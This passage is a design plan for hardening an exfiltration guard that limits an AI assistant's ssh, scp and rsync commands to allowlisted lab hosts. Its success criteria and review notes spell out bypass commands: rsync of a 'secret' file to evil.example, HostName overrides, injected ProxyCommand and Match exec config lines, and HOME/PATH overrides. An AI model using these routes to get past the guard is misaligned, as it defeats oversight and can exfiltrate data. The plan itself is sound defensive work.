both spellings:**

- `-o ProxyCommand=…` and `-o ProxyJump=…` — routing (already refused today).
- `-o LocalCommand=…` and `-o PermitLocalCommand=yes` — local command execution
  (already refused today).
- `-o KnownHostsCommand=…` — command execution during host-key lookup (to be
  **added** to the existing refusal regex; it is a command-executing `-o` form the
  current regex misses).
- `-J <hops>` — **not** rejected, and **no longer** matched by the immediate
  per-hop `_require_lab` loop (that call is removed — see the `_check_ssh_family`
  change above). Each hop is collected into the destination list and expanded
  through `_resolve_ssh_destination` (so a jump-host *alias* is resolved like any
  other destination, and each hop's own `ProxyJump` chain is followed under the
  step-7 depth/cycle bound) *before* `_require_lab`, so `ssh -J amd-halo-ci
  amd-halo` resolves the alias rather than rejecting it against the literal
  allowlist.

The forwarded `-o`/`-F` set above applies to resolving the **primary**
destination only. A `-J`/`ProxyJump` hop is resolved with the hop-specific
option set of step 7 — the shared `-F` but **none** of the target's `-o`
host-selecting values — because OpenSSH does not apply the target's `-o
HostName=…` to the jump connection, and forwarding it would let a target
override clear a non-allowlisted hop.

Everything else on the command line (positional host, `-p`/`-l`/`-i`/… transport
flags that do not select the config) is neither forwarded nor rejected — it does not
affect which host `ssh -G` reports.

**The contract is per program, not per family (review follow-up).** Today
`_check_ssh_family` parses every ssh-family program with the one ssh table
`_SSH_VALUE_FLAGS`, which is right for ssh only:

- **ssh, scp, sftp** — `-F <file>` and `-o <opt>` mean the same thing to all three,
  so the forwarded set above applies. scp and sftp take different *other* value
  flags (for example scp's `-l limit`, `-P port`, `-S program`; sftp's `-b
  batchfile`, `-D server_path`, `-P port`, `-s subsystem`), so each needs its own
  value-flag table for `_ssh_positionals` rather than ssh's, or a value is
  misread as a positional (or the reverse).
- **rsync — forward nothing.** rsync's `-F` (filter-rule shorthand), `-o`
  (`--owner`), `-p`, `-l`, `-D`, `-c`, `-b`, `-m`, `-S`, `-E`, `-I`, `-P`, … are
  rsync switches with no argument and no meaning to ssh. rsync passes options to
  ssh only through `-e`/`--rsh`/`RSYNC_RSH`, which are already refused, so the
  resolver runs `ssh -G <host>` with **no** forwarded options for an rsync
  destination; `rsync -F src amd-halo-ci:dst` must not become
  `ssh -G -F src amd-halo-ci`.

  **Daemon-mode (`::`) rsync destinations are never resolved.** `_REMOTE_SPEC`
  matches one *or two* colons (`::?`), so it captures the remote-shell
  `host:path` and the rsync-daemon `host::module` forms with the same host
  group, and `rsync://` is handled as a URL. Daemon mode does **not** start ssh
  and does not read ssh config, so alias resolution must not apply to it:
  resolving `evil-alias::module` through `ssh -G` could report an allowlisted
  `hostname` while rsync connects to the literal daemon host `evil-alias`,
  turning resolution into a bypass. The resolve-then-require pass therefore sends
  only **remote-shell** rsync destinations (a single colon, and not an `rsync://`
  URL) through `_resolve_ssh_destination`; a `::` or `rsync://` destination keeps
  today's literal match against the token's own host. The rsync parser must
  record which colon form matched (the current single capture group does not), so
  the pass can tell a daemon destination from a remote-shell one; a regression
  case covers `rsync src amd-halo-ci::module` being literal-matched, not
  resolved.

**Prerequisite: rsync's destinations must be parsed with rsync's own option
table.** Because `_SSH_VALUE_FLAGS` is applied to rsync, the token after any of
those switches is swallowed as the switch's "value": by reading the code,
`rsync secret -o evil.example:/tmp/` yields no remote spec, no `_require_lab` call,
and is allowed today, although rsync (which permutes options) copies `secret` to
`evil.example`. That is a live bypass independent of aliases, tracked as tracker
task `6b5e109d-3bce-4e93-aecf-98be2fd954c9`; it should land first (or in the same
change), because the resolver can only resolve the destinations the parser finds.

The regression tests (see Success criteria) must cover the attached and separate
spellings of both a forwarded `-o` (`-o HostName=` and `-oHostName=`) and `-F`
(`-F file` and `-Ffile`), and the rejection of each command-executing `-o` form.

### Why this is not a new exfiltration vector

The resolver runs `ssh -G` only when the command itself runs the `ssh` found on
`PATH` (a bare `ssh`/`scp`/`sftp`/`rsync`, never a path-qualified program), only
when that ssh is a system binary, only when neither `HOME` nor `PATH` is changed
for the command (leading, set earlier on the line, or through a `source`/`.`),
and in the command's own working directory — reading the per-user config from the
passwd home exactly as `ssh -G` does — so it reads the same `~/.ssh/config`,
`-F` file and system config the real command reads. Under those conditions an
environment that could make `ssh -G` report a false hostname already controls
where the real `ssh` connects, so resolution introduces no discrepancy an
attacker could exploit; whenever one of the conditions does not hold, the
resolver does not run and today's literal match decides (or the command is
blocked). The guard's existing fail-closed posture is preserved: resolution only
ever *adds* a block (a bad HostName, ProxyJump or ProxyCommand) or defers to the
literal match it replaces.

"No new vector" is the precise claim, and it is narrower than "fail closed in
every respect". One pre-existing gap it does **not** close: when the resolver
falls back to the literal match because the PATH-selected ssh-family binary is
untrusted (outside `SYSTEM_PREFIXES`), the command is still *allowed* for an
allowlisted host even though the untrusted binary runs — identical to today's
base-branch behaviour, and tracked as tasks `8a5be352-003a-4c2c-955d-5e913f4ca625`
and `dfed2140-25dc-4290-b718-b41d0561236b` (see step 2 and Open questions).
Resolution does not make this worse; it also does not fix it.

One caveat qualified this during review and is now **resolved** (thread #3): `ssh
-G` evaluates `Match exec` config blocks and runs `ProxyCommand`/`LocalCommand`/
`KnownHostsCommand` references, so a config that defines one would make resolution
run a local command — and because the guard's threat model is the assistant itself,
an assistant that writes its own `~/.ssh/config` with a `Match exec` directive could
have the guard execute that command via the resolution call even on a destination
the guard ultimately blocks, where the real `ssh` would never run it. The resolution
is the step-3 static config scan: `ssh -G` is invoked **only** on a config proven
free of command-executing directives; a config found to carry such a directive is
**blocked outright** (never resolved, and — crucially — never let through by literal
fallback even when the token is itself an allowlisted name), and only a genuinely
absent config chain falls back to the literal match — a config that is present but
cannot be fully read or parsed also blocks. So resolution adds **no**
new path that executes an assistant-controlled command; it only ever *adds* a block
(a bad HostName, ProxyJump, ProxyCommand, or a command-executing config directive) or
defers to the literal match it replaces.

### Testing seam

The tests need deterministic `ssh -G` output without a real SSH config. The
faithful, least-mocking approach: the fixture writes a small fake `ssh`
executable into a temp directory and prepends it to `PATH` for the duration of the
test, so `shutil.which("ssh")` finds it and it emits canned `-G` output keyed on
the alias argument (and exits non-zero for the "resolution failure" case). This
exercises the real subprocess path end to end. Because step 2 refuses to run an
ssh outside `SYSTEM_PREFIXES`, and the fixture's temp directory is outside them,
the trusted-location rule needs a seam: keep the trusted prefixes in one
module-level name the resolver reads (or locate ssh through one module-level
function, as `exfil_bash_dispatch.shutil_which` already is) so a test can add the
fixture directory for its duration. One test must leave the seam alone and prove
the converse: a fake `ssh` placed first on `PATH` outside the trusted prefixes is
**not executed** (its sentinel file is never created) and the literal match
decides.

**The config roots need their own seam too.** The fake `ssh` alone cannot drive
the success path: the resolver scans the passwd-home `~/.ssh/config` and
`/etc/ssh/ssh_config` *before* it runs `ssh -G`, and when that chain is absent it
takes the literal fallback and never invokes the fake binary — so an
alias-to-allowlisted or config-scan test would neither reach resolution
deterministically nor be isolated from the CI runner's real SSH configuration.
`GuardFixture` builds a temp repository, not the user's passwd-home config, and
`HOME` cannot be redirected to a fixture (step 1 refuses a `HOME` override and
step 3 reads the passwd home, not `$HOME`). So the resolver must read its config
roots — the passwd-home base that `~` expands to, and the system-config path —
through module-level names (as it locates `ssh` through one module-level
function), and the fixture points **both** at an isolated config tree for the
test's duration, writing the alias's `~/.ssh/config`, any `-F` file, and an empty
system-config file there. The tests then assert on a fully controlled config
chain — the system config is explicitly neutralised (an empty fixture file),
never the runner's — and the resolution path runs deterministically.

A new sibling module is used rather
than extending `test_exfiltration_guard_check.py`, which is already 1591 lines
against the 1600-line hard limit; the existing `test_exfiltration_guard_transport.py`
establishes the sibling-module-on-shared-`GuardFixture` pattern, and CI already
discovers `test_exfiltration_guard_*.py`.

## Success criteria

A reviewer confirms the task is done when:

- `ssh amd-halo-ci`, where the fake config maps `amd-halo-ci`'s HostName to the
  allowlisted `amd-halo`, is **allowed** — the originally reported case.
- `ssh evil-alias`, mapping to a non-allowlisted HostName, is **blocked** with the
  existing "not an allowlisted lab host" reason.
- An alias whose `ProxyJump` resolves to a non-allowlisted host is **blocked**
  (and, symmetrically, a `ProxyCommand`-bearing alias is blocked as unverifiable).
- `ssh -o HostName=evil.example amd-halo`, where the command line overrides the
  resolved host to a non-allowlisted one, is **blocked** — the host/config-selecting
  `-o` option is forwarded to `ssh -G`, so the guard checks `evil.example`, not the
  positional `amd-halo`. (This case is **allowed** on the base branch, so it is the
  regression test for the forwarding contract in "Faithful resolution".) The
  **attached** spelling `ssh -oHostName=evil.example amd-halo` is blocked the same
  way, and `-F file` / `-Ffile` both reach `ssh -G` as the config selector.
- Each command-executing `-o` form is **rejected before resolution**:
  `-o ProxyCommand=…`, `-o ProxyJump=…`, `-o LocalCommand=…`,
  `-o PermitLocalCommand=yes`, and the newly-added `-o KnownHostsCommand=…`, in both
  the separate and attached spellings and case-insensitively.
- A command-scoped environment override that selects the config or binary is
  **blocked**: `HOME=/tmp/evil ssh amd-halo` and `PATH=/tmp ssh amd-halo` are both
  refused, while a harmless assignment (`LANG=C ssh amd-halo`) is unaffected.
- A config that can execute a command during resolution causes the resolver to
  **not run `ssh -G`** and to **block** (not merely fall back): a `Match exec` (or
  `ProxyCommand`/`LocalCommand`/`PermitLocalCommand yes`/`KnownHostsCommand`)
  directive anywhere in the reachable config chain blocks the command outright —
  tested both for a cosmetic alias (`ssh amd-halo-ci`, blocked) **and for a token
  that is itself an allowlisted literal** (`ssh amd-halo` with such a directive in
  `~/.ssh/config`, which must still be **blocked**, not allowed by literal fallback —
  this is the allowlisted-literal bypass the static scan must close). Critically, the
  test confirms the `Match exec` command is **never executed** by resolution (e.g. a
  `Match exec` that would `touch` a sentinel file leaves no sentinel). Only a
  **genuinely absent** config chain (no user config, no system config, no `-F`, no
  `Include` match) falls back to the literal match; a config file that is present but
  cannot be fully read or confidently parsed **blocks** — tested with a config the
  scanner cannot parse (`ssh amd-halo` with an unparseable `~/.ssh/config`, blocked,
  no `ssh -G` run). An `Include` whose path carries a `%`-token or a `${ENV}`
  reference the scanner does not expand is likewise content uncertainty and
  **blocks** (`ssh amd-halo` with `Include %d/.ssh/extra` in `~/.ssh/config`,
  blocked, no `ssh -G` run) — it must not be read as an absent-glob literal
  fallback.
- A write to the reachable config chain earlier on the same line **blocks** the
  ssh-family command: `printf 'ProxyCommand touch /tmp/pwned\n' > ~/.ssh/config;
  ssh amd-halo` is refused and no sentinel is created, because the pre-execution
  scan cannot vouch for a file a preceding command rewrites. A write to an
  **absolute `Include` target** blocks the same way (`printf 'ProxyCommand …' >
  /tmp/extra.conf; ssh -F /tmp/base.conf amd-halo`, where `/tmp/base.conf`
  includes `/tmp/extra.conf`), and so does a config-writing **command
  substitution** earlier on the line (`: "$(printf 'ProxyCommand …' >
  ~/.ssh/config)"; ssh amd-halo`).
- A config-source `-o` is **rejected before resolution**: `ssh -o Include=/tmp/x
  amd-halo` (and the attached `-oInclude=…`, case-insensitively) is **blocked**,
  so no `ssh -G` reads a file the static scan never inspected.
- A zero-exit `ssh -G` whose output is **malformed or incomplete** (the fake ssh
  prints no `hostname` line, or a duplicate/garbled one) **blocks** — it is not
  treated as a resolution failure, so an allowlisted literal (`ssh amd-halo`) is
  **not** cleared by a result the resolver could not trust.
- A `-J` jump-host **alias** resolves before the allowlist match: `ssh -J amd-halo-ci
  amd-halo`, where `amd-halo-ci` resolves to the allowlisted `amd-halo`, is
  **allowed** (on the base branch the immediate per-hop `_require_lab` rejects the
  alias, so this is the regression test for the `-J` resolve-then-require change),
  while `ssh -J evil-alias amd-halo`, whose hop resolves to a non-allowlisted host,
  is **blocked**.
- A jump hop does **not** inherit the target's `-o` host-selecting values:
  `ssh -o HostName=amd-halo -J evil-jump amd-halo`, where the target is overridden
  to the allowlisted `amd-halo` but the jump `evil-jump` resolves to a
  non-allowlisted host, is **blocked** — the hop is resolved with the hop-specific
  option set (step 7), so the target's `-o HostName=` cannot clear it.
- A cyclic `ProxyJump` config (`Host a ProxyJump b` / `Host b ProxyJump a`)
  terminates: resolution is bounded by `_MAX_PROXYJUMP_DEPTH`/`_MAX_SSH_RESOLUTIONS`
  and a visited set, makes a bounded number of `ssh -G` calls, and **blocks** on
  exhaustion (the unresolved hop is never cleared by a literal match, even when the
  unresolved hop token is itself allowlisted).
- When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent), the guard falls
  back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
  allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
  i.e. identical to today's behaviour.
- `HOME`/`PATH` set earlier on the line reaches the step-1 refusal in every form:
  `export HOME=/tmp/evil; ssh amd-halo` and `export PATH=/tmp; ssh amd-halo`
  (exported), `PATH=/tmp; ssh amd-halo` and `HOME=/tmp/evil; ssh amd-halo`
  (plain assignment, not exported), and `source env.sh; ssh amd-halo` /
  `. env.sh; ssh amd-halo` (sourced — `HOME`/`PATH` treated as unknown, so
  blocked) are all **blocked**, while `export PATH=$PATH:/x; ls` (no ssh on the
  line) and `export EDITOR=vim; ssh amd-halo` are unaffected. An `unset PATH; ssh
  amd-halo` and `unset HOME; ssh amd-halo` are **blocked** too (clearing the
  variable is an override), and the `env` wrapper forms `env -i ssh amd-halo`,
  `env -u PATH ssh amd-halo` and `env -u HOME ssh amd-halo` are **blocked** via
  the override marker the wrapper surfaces.
- A path-qualified ssh executable is **not run by the resolver**: with a sentinel
  script at `/tmp/ssh`, `/tmp/ssh amd-halo-ci` falls back to the literal match
  (blocked, alias not allowlisted) and the sentinel is never created; likewise a
  fake `ssh` first on `PATH` but outside `SYSTEM_PREFIXES` is never executed.
- The resolver honours the command's working directory: `cd <dir>; ssh -F config
  amd-halo-ci`, where `<dir>/config` maps the alias to a non-allowlisted host, is
  **blocked**, and the same with a `<dir>/config` that maps it to `amd-halo` is
  **allowed** — even when a different `config` file sits in the hook process's
  directory. A relative `-F` after a `cd` to a computed target is blocked by
  `ctx.require_cwd`.
- rsync forwards nothing: `rsync -F src/ amd-halo-ci:dst/` resolves `amd-halo-ci`
  with no `-F` passed to `ssh -G` (allowed when it maps to `amd-halo`), and the
  prerequisite parser fix makes `rsync src -o evil.example:/tmp/` **blocked**.
- An rsync **daemon-mode** destination is literal-matched, never resolved:
  `rsync src amd-halo-ci::module`, where `amd-halo-ci` would resolve to the
  allowlisted `amd-halo` under ssh config, is matched against the literal
  `amd-halo-ci` (blocked, alias not allowlisted) and `ssh -G` is never run,
  because daemon mode does not use ssh; the same holds for an `rsync://` URL
  destination.
- The same cases hold for `scp`/`rsync`-over-ssh destinations.
- The existing ssh/scp/rsync tests in every existing `test_exfiltration_guard_*.py`
  module (`_check`, `_transport`, `_interpreter`, `_worktree`, `_pinning`) still
  pass unchanged (no regression to
  literal allowlisted hosts, *literal* jump-host `-J` handling — a literal
  non-allowlisted `-J` hop is still blocked and a literal allowlisted one still
  allowed, now via the resolver's literal fallback rather than the removed immediate
  loop — or the transport-env refusals).

Tests to run:

```
python3 -m pytest .claude/hooks/lib/test_exfiltration_guard_ssh_alias.py -q
python3 -m pytest .claude/hooks/lib/test_exfiltration_guard_transport.py -q
```

and the ssh-family cases of `test_exfiltration_guard_check.py`
(`BashNetworkTests::test_rsync_and_ssh_honour_allowlist` and the surrounding
network tests). CI runs all `test_exfiltration_guard_*.py` modules via
`python3 -m unittest discover`.

## Dependencies

- **One blocking tracker dependency:** the rsync option-parsing prerequisite
  below (`6b5e109d-3bce-4e93-aecf-98be2fd954c9`), which the tracker task's
  `blocked_by` lists. No others.
- **Owner sanction on the implementing job.** This edits files under
  `.claude/hooks`, which are protected: the implementation job must carry the
  owner's explicit `skip_agent_permission_prompts` / sensitive-file bypass, and
  the agent must not route around the hook that protects these files. Separately,
  `verify-exfiltration-guard.sh` CHECK 3 compares the guard's `GUARD_FILES`
  against the base branch off non-`ci/` branches, and `exfil_bash_network.py` is
  one of those files, so this change trips that check and the implementing job
  must run the workflow with `override_integrity_checks` set (see the verified
  dependency note under "Resolved review decisions"). This is distinct from the
  CI-file lock: a guard-library change is not under `check-ci-file-lock.sh`
  (which covers `.github/workflows/` and `tools/ci/`), so a `ci/...` branch name
  is not *required*. Note, though, that `exfil_bash_network.py` and
  `exfil_bash_dispatch.py` are also in the `PROTECTED_FILES` list of the
  "Check for enforcement infrastructure tampering" step in
  `.github/workflows/analysis.yaml`, so on a non-`ci/` branch that step fails too
  unless the same `override_integrity_checks` input is set. A `ci/...` branch is
  the alternative: it lifts both that tampering check and CHECK 3 for files
  under `.claude/hooks/` without an override (see the root `CLAUDE.md`, "Rules
  That Cannot Be Bypassed", item 2). Which route to take is the owner's call.
- **Required part of the change, not an option: register the new test module in
  both protected lists.** Every existing `test_exfiltration_guard_*.py` module is
  listed in `GUARD_FILES` in
  `tools/ci/agent-protection/verify-exfiltration-guard.sh` and in the tampering
  step's `PROTECTED_FILES` in `.github/workflows/analysis.yaml`. The new
  `test_exfiltration_guard_ssh_alias.py` must be added to **both** as part of the
  implementing change; otherwise a later branch could weaken these alias
  regression tests without either integrity check noticing — defeating the point
  of adding them. Because both lists are under the CI-file lock
  (`.github/workflows/` and `tools/ci/`), that registration must land on a
  `ci/...` branch (or with the owner's signed bypass). The implementation is
  **incomplete** until the registration lands. (This was an Open question in an
  earlier draft and is now a firm dependency.)
- **Blocking prerequisite (separate task):** the rsync option-parsing fix,
  `6b5e109d-3bce-4e93-aecf-98be2fd954c9` (see "Faithful resolution"). Without it,
  rsync destinations hidden behind an rsync switch never reach the resolver, so
  the rsync Success criterion cannot be met if this fix lands after the resolver.
  It is therefore a real dependency, recorded in the tracker task's `blocked_by`:
  the implementing job either waits for `6b5e109d` to close or folds the parser
  fix into the same change.
- **Related (separate tasks):** the path-qualified ssh-family scan gap,
  `dfed2140-25dc-4290-b718-b41d0561236b`, and the bare untrusted-PATH ssh-family
  binary gap, `8a5be352-003a-4c2c-955d-5e913f4ca625`. This plan only guarantees
  the resolver never *runs* such a program; validating or refusing the family
  executable the shell will run is those tasks (see step 2 and Open questions).

## Resolved review decisions

The review raised five points; all are now settled in the body above (none is left
to the implementer's discretion):

1. **Which ssh options to forward to `ssh -G`, and how `-J` is matched** (thread #1
   and its follow-up). Settled in "Faithful resolution and its options": forward
   `-F <file>` and **every** non-rejected `-o <key>=<value>` (so no host/config-
   selecting key is dropped, closing the `-o HostName=` hole), in both the separate
   and attached spellings; reject the routing/command-executing `-o` forms
   (`ProxyCommand`, `ProxyJump`, `LocalCommand`, `PermitLocalCommand`, and the
   newly-added `KnownHostsCommand`) before resolution; forward/forget everything
   else. The resolver's docstring records this set. `-J` hops are **not** matched by
   the immediate per-hop `_require_lab` loop any more (that call is removed); they are
   collected into the destination list and expanded through the resolver — like the
   positional host — so a jump-host *alias* resolves before the allowlist match, with
   each hop's own `ProxyJump` chain followed under the step-7 bound.
2. **Command-scoped environment overrides** (thread #2). Settled in "Command-scoped
   environment": `_check_ssh_family` now receives the captured `env`, and the
   resolver blocks when `HOME` or `PATH` is assigned (and, per the fourth round,
   when either is set earlier on the line or through a `source`/`.`) — fail
   closed, never resolve under or around an attacker-chosen environment.
3. **`Match exec` / command execution during `ssh -G`** (thread #3). Settled in
   resolver step 3 and "Why this is not a new exfiltration vector": a static,
   execution-free scan of the reachable config chain precedes `ssh -G`, and `ssh -G`
   runs **only** on a config proven free of `Match exec`/`ProxyCommand`/
   `LocalCommand`/`PermitLocalCommand yes`/`KnownHostsCommand`. A config found to
   carry such a directive is **blocked outright** — not returned as a literal, which
   would let an allowlisted-literal token (`ssh amd-halo`) slip through `_require_lab`
   despite the directive; only a **genuinely absent** config chain falls back to
   the literal match, while a present-but-unparseable one blocks (fourth round). No
   new command-execution path is introduced, and no command-executing config is ever
   allowed.
4. **ProxyJump depth and cycle policy** (thread #4). Settled in resolver step 7:
   iterative hop resolution bounded by `_MAX_PROXYJUMP_DEPTH` (10) and
   `_MAX_SSH_RESOLUTIONS` (16) with a visited set; on exhaustion the resolver
   **blocks** (fourth round — it no longer literal-matches an unresolved hop, which
   could clear an allowlisted hop token over an unknown chain). A cyclic config
   terminates with bounded subprocess work.
5. **No pinned release number** (thread #5). The release line now refers to the root
   `pom.xml` `<version>` instead of a concrete number.

A third review round raised four more points, settled the same way:

6. **Which ssh the resolver runs.** Settled in resolver step 2: never a
   path-qualified program and never one outside `SYSTEM_PREFIXES`; either case
   is a literal fallback. The pre-existing scan gap for path-qualified
   ssh-family programs is a separate task.
7. **Working directory.** Settled in resolver steps 3 and 4: a relative `-F` is
   resolved, scanned and passed to `ssh -G` relative to `ctx.command_cwd`, and
   `ssh -G` runs with that cwd; relative `Include` paths follow `ssh_config(5)`
   (`~/.ssh` or `/etc/ssh`), not the cwd — the review's suggestion to resolve
   `Include` against the cwd would not match what ssh does.
8. **Exported `HOME`/`PATH`.** Settled in "Preceding HOME/PATH assignments":
   names set earlier on the line are tracked and the step-1 refusal applies to
   them; the assignment/export itself stays allowed. (The fourth round broadened
   this from exports to plain assignments and sourced files — see below.)
9. **Per-program forwarding.** Settled in "Faithful resolution": the `-F`/`-o`
   forwarding applies to ssh/scp/sftp, each parsed with its own value-flag table;
   rsync forwards nothing, and its parser fix is a prerequisite task.

A fourth review round (Copilot, PR #1133 HEAD) raised ten more points, settled the
same way:

10. **Scan the config OpenSSH actually reads** (the `TODO(review)` now
    resolved). Settled in resolver step 3: the per-user config
    is located from the passwd-database home (`pwd.getpwuid(os.getuid()).pw_dir`)
    and `~` expands to it, matching how OpenSSH builds the path and expands `~` —
    `$HOME` is not consulted, so the scanned file is the file `ssh -G` reads even
    when the hook's `HOME` differs from `pw_dir`. If the passwd entry cannot be
    resolved, the scan blocks.
11. **Block on scan-content uncertainty.** Settled in resolver
    step 3: only a genuinely absent config chain falls back to the literal match; a
    file present but unreadable or unparseable, or an un-followable `Include`,
    blocks — parse uncertainty is no longer lumped into literal fallback.
12. **TOCTOU: a config rewritten earlier on the line.**
    Settled in "Config-chain modification earlier on the line": a redirection or
    copy into the reachable config chain earlier on the same command line poisons
    the scan, so the ssh-family command blocks; tracked on `BashContext` like the
    `cd` and assignment set.
13. **Jump hops use OpenSSH-faithful options.** Settled in
    resolver step 7 and the `-J` note under "Faithful resolution": a hop is
    resolved with the shared `-F` but **none** of the target's `-o` host-selecting
    values, because OpenSSH does not forward them to the jump; a target
    `-o HostName=` cannot clear a non-allowlisted hop.
14. **Block on jump-chain exhaustion.** Settled in resolver
    step 7: depth/cycle/invocation-cap exhaustion blocks rather than literal-matching
    the unresolved hop.
15. **Track preceding `HOME`/`PATH` assignments, not only exports.**
    Settled in "Preceding HOME/PATH assignments": a plain `PATH=/tmp; ssh …`
    assignment (which changes the shell's own command lookup without being exported)
    is tracked too, and the `env -i`/`env -u` wrapper forms are treated as overrides.
16. **`source`/`.` fails closed.** Settled in "Preceding
    HOME/PATH assignments": a `source`/`.` earlier on the line is treated as setting
    both names, so a later ssh-family command blocks. No longer an open question.
17. **Register the new test module in both protected lists.**
    Moved from an Open question to a firm Dependency: the implementation is
    incomplete until the new module is added to `GUARD_FILES` and the tampering
    step's `PROTECTED_FILES`.
18. **The family executable the shell runs is not validated.**
    Acknowledged as a **pre-existing** gap, not closed here: when the
    resolver falls back to the literal match for an untrusted PATH-selected binary,
    an allowlisted host is still allowed though the untrusted binary runs — exactly
    today's base-branch behaviour. Scoped out of the "no new vector" claim (step 2,
    "Why this is not a new exfiltration vector") and tracked as tasks
    `8a5be352-003a-4c2c-955d-5e913f4ca625` (bare name) and
    `dfed2140-25dc-4290-b718-b41d0561236b` (path-qualified); whether to fold a
    fail-closed fix into this change is left to the approver (Open questions).

Separately, a verified dependency (not an open question): **`verify-exfiltration-guard.sh`
base-branch comparison.** The verifier's `GUARD_FILES` list includes
`exfil_bash_network.py` and `test_exfiltration_guard_check.py`, and its CHECK 3
compares every one of those between the merge base with the base branch and HEAD on a
non-`ci/` branch. A guard-*library* edit therefore **does** trip the integrity check —
it is not limited to workflow-file edits — so the implementing job must run the
workflow with `override_integrity_checks` set, exactly as the design doc's "Adding an
allowlisted host" step 4 prescribes for any enforcement-file change. The new sibling
test module is not in `GUARD_FILES`, so adding it does not itself trip CHECK 3; the
edit to `exfil_bash_network.py` (and any new case added to
`test_exfiltration_guard_check.py`) is what requires the override. This is a
dependency to satisfy at submission time, not a reason to weaken the check.

## Open questions for the approver

These are not defects in the plan; they are trade-offs the person approving it
should decide deliberately.

1. **The config scan blocks every ssh-family command when any host block has a
   command-executing directive.** The step-3 scan is necessarily whole-file: which
   `Host`/`Match` block applies cannot be known without running `ssh -G`, which is
   what the scan guards. So a `~/.ssh/config` with a `ProxyCommand` or `Match exec`
   for an *unrelated* host blocks `ssh amd-halo` too — a regression from today,
   where that command is allowed. Fail-closed and consistent with the
   assistant-is-the-adversary threat model, but it may disable lab access on a
   node whose owner uses `ProxyCommand` elsewhere. Options: accept it (and test
   it explicitly); narrow the scan to the blocks that precede and could match the
   destination by a pure textual `Host` pattern match, treating any `Match` block
   as matching; or limit blocking to directives in the files the assistant can
   write. A lab node's real config should be checked before deciding.
2. **Should this change also close the untrusted-family-executable gap?** When the
   resolver falls back to the literal match because the PATH-selected
   `ssh`/`scp`/`sftp`/`rsync` is untrusted (path-qualified, or outside
   `SYSTEM_PREFIXES`), an allowlisted host is still *allowed* though the untrusted
   binary runs. This is a pre-existing gap (identical on the base branch) and is
   tracked separately (`8a5be352-003a-4c2c-955d-5e913f4ca625`,
   `dfed2140-25dc-4290-b718-b41d0561236b`), so this plan does not change it.
   Folding a fail-closed fix (validate the family executable against
   `SYSTEM_PREFIXES`; block an untrusted one) into *this* change would make the
   resolver's posture genuinely fail-closed, at the cost of blocking
   `ssh <allowlisted>` on any node whose `PATH` prefers a non-system ssh — a
   behaviour change the approver should weigh against doing it as the separate
   task. The plan's current scope keeps it separate.
3. **How precise can the TOCTOU config-write detection be?** The fail-closed rule
   in "Config-chain modification earlier on the line" blocks an ssh-family command
   whenever an earlier command on the line could write into the reachable config
   chain, and blocks when a write target cannot be determined. This refuses the
   rare legitimate `write-config; ssh` one-liner and depends on the dispatcher
   recognising the write forms (redirections, `cp`/`mv`/`tee`/`install`/`dd`). A
   write via an unrecognised tool, or into a path the scanner cannot resolve, is
   handled by the catch-all "cannot determine ⇒ block", but the approver should
   confirm the conservative blocking is acceptable and that the recognised-write
   list is broad enough for the real threat.
4. **How completely must the config scan reproduce OpenSSH's `Include`
   resolution?** The scan has to locate every file `ssh -G` would read, but
   OpenSSH expands `Include` (and `-F`) paths through `%`-tokens, `${ENV}`
   references, `~`, globs, and a potentially deep include tree, and it will
   follow an `Include` to an absolute path anywhere on the filesystem, not only
   under `~/.ssh` or `/etc/ssh`. The plan's answer is conservative — expand `~`
   and globs, follow absolute and relative includes to a bounded depth, and
   treat anything the scanner cannot reproduce (a `%`-token or `${ENV}` path, an
   include tree past the depth bound, an unreadable or unparseable included
   file) as content uncertainty that **blocks** rather than falling through to
   literal fallback. That is fail-closed and no new vector, but it means a real
   config that legitimately uses a tokenized or env-driven `Include` would block
   every ssh-family command on the node, the same usability trade-off as
   question 1. The approver should confirm the conservative blocking is
   acceptable, decide the bounded follow depth (a named constant, like
   `_MAX_PROXYJUMP_DEPTH`), and weigh whether the scanner should instead
   reproduce `%`-token/`${ENV}` expansion for the common tokens so such configs
   resolve rather than block. (This is the "tokenized and external includes"
   edge case the Copilot review flagged for human assessment.)
5. **The tracker task's description is behind the plan.** Task
   `7f7b02cb-0001-460e-82d0-35e6cdba4486` still describes a detected `Match exec`
   as a literal fallback, while the plan (after review) blocks it, and it does not
   mention the passwd-home config scan, the parse-uncertainty/TOCTOU blocks, the
   broadened `HOME`/`PATH` and `source` tracking, the jump-hop option set, the
   block-on-exhaustion policy, or the per-program forwarding rules. The plan is the
   authoritative contract; the task description should be refreshed when the plan
   is approved.
6. **A residual race the single-line scan cannot close.** The static scan
   (step 3) and the separate `ssh -G` subprocess (step 4) read the config chain
   at two different instants. The "Config-chain modification earlier on the line"
   rule closes the *same-line* write — a preceding command or substitution that
   rewrites the chain — but it cannot see a write that races from outside the
   analysed line: a background process started earlier (`sleep 0; evil &`), a
   concurrent Bash tool call, or a symlink/file replacement swapped in between the
   scan and the `ssh -G` reread. In that window a chain the scan proved clean can
   gain a `Match exec`/`ProxyCommand` that the real `ssh -G` then honours. This is
   a narrow window (the two reads are milliseconds apart and the attacker must win
   a race inside one hook invocation), and it is no worse than the base branch,
   which runs no `ssh -G` at all — but it is the one path where the "`ssh -G` only
   on a proven-clean config" guarantee is probabilistic rather than absolute. The
   fail-closed closure is to make `ssh -G` read an **isolated snapshot**: copy the
   scanned config chain to a private temp tree and run `ssh -G -F <snapshot>`
   against it, so the file `ssh -G` evaluates is byte-for-byte the file the scan
   cleared and cannot be swapped underneath it. The approver should decide whether
   to require the snapshot now or accept the residual race as a documented limit
   (the snapshot adds per-resolution copy cost and must reproduce OpenSSH's
   include/relative-path resolution into the snapshot tree, which is non-trivial).

## Estimated complexity

**Moderate.** The resolver plus an execution-free config-chain scanner (with
ssh's own relative-path and passwd-home rules), a trusted-ssh check, a bounded
ProxyJump walk with a hop-specific option set, and the config-write (TOCTOU)
detection are added to `exfil_bash_network.py`; `_check_ssh_family` gains an `env`
parameter and per-program value-flag tables, and its final loop expands each host
through the resolver; the dispatcher threads `env` through and tracks the
`HOME`/`PATH` set (plain assignments, exports, `env -i`/`-u`, and `source`/`.`)
and the config-chain-modified mark alongside the `cd` tracking on `BashContext`;
the command-executing `-o` refusal regex gains `KnownHostsCommand`; one new test
module (registered in both protected lists); and a two-sentence doc note. The
rsync parser fix is a separate prerequisite task. No API changes beyond the
internal `_check_ssh_family` signature and `BashContext`, no new Maven/Python
module, no production-code changes outside the hook library.
